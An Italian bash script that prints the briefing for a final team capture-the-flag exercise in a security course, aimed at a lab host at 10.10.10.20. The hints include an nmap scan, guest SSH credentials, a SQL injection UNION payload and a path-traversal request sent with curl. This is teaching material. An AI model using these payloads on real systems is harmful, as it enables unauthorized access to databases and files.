#!/usr/bin/env bash
# Lezione 39 · lato Kali · CTF finale a squadre. Briefing delle sfide. Sola lettura.
set -uo pipefail
TARGET_IP="10.10.10.20"
echo "== Lezione 39 · CTF FINALE a squadre =="
echo
ping -c1 -W2 "$TARGET_IP" >/dev/null 2>&1 && echo "[OK] Bersaglio raggiungibile." \
  || echo "[--] Bersaglio non raggiungibile: il docente ha lanciato  lab 39  (e  lab 12 )?"
cat <<'MSG'

------------------------------------------------------------
 CTF FINALE · 6 sfide, 80 punti. Consegna le flag al docente!
------------------------------------------------------------
 Bersaglio: 10.10.10.20   Accesso ospite SSH: studente / studente

 [ ] RECON (+10)  Trova un servizio nascosto su una porta insolita e leggilo.
        sudo nmap -p- 10.10.10.20        (cerca una porta strana)
        curl http://10.10.10.20:<porta>

 [ ] FIND (+10)   Entra via SSH e scava: una flag e' sepolta in /srv/ctf.
        ssh studente@10.10.10.20
        find /srv/ctf -type f 2>/dev/null ; grep -r FLAG /srv/ctf 2>/dev/null

 [ ] PERMESSI (+10)  In /srv/ctf c'e' un segreto di root leggibile da tutti.
        ls -l /srv/ctf ; cat /srv/ctf/backup_root.txt

 [ ] WEB SQLi (+20)  Estrai un segreto dal database della Banca (:8080).
        curl "http://10.10.10.20:8080/cerca?conto=' UNION SELECT chiave,valore,'x' FROM segreti -- "

 [ ] WEB LFI (+20)  Leggi un file riservato con il path traversal.
        curl "http://10.10.10.20:8080/documenti?file=../segreti/ctf_lfi.txt"

 [ ] BASE64 (+10)  Decodifica il messaggio offuscato in /srv/ctf.
        cat /srv/ctf/messaggio.b64 | base64 -d

 Regole: a squadre; ogni flag vale i punti indicati; vince chi fa piu' punti.
 Consegnate ogni flag al docente per la convalida.
------------------------------------------------------------
MSG
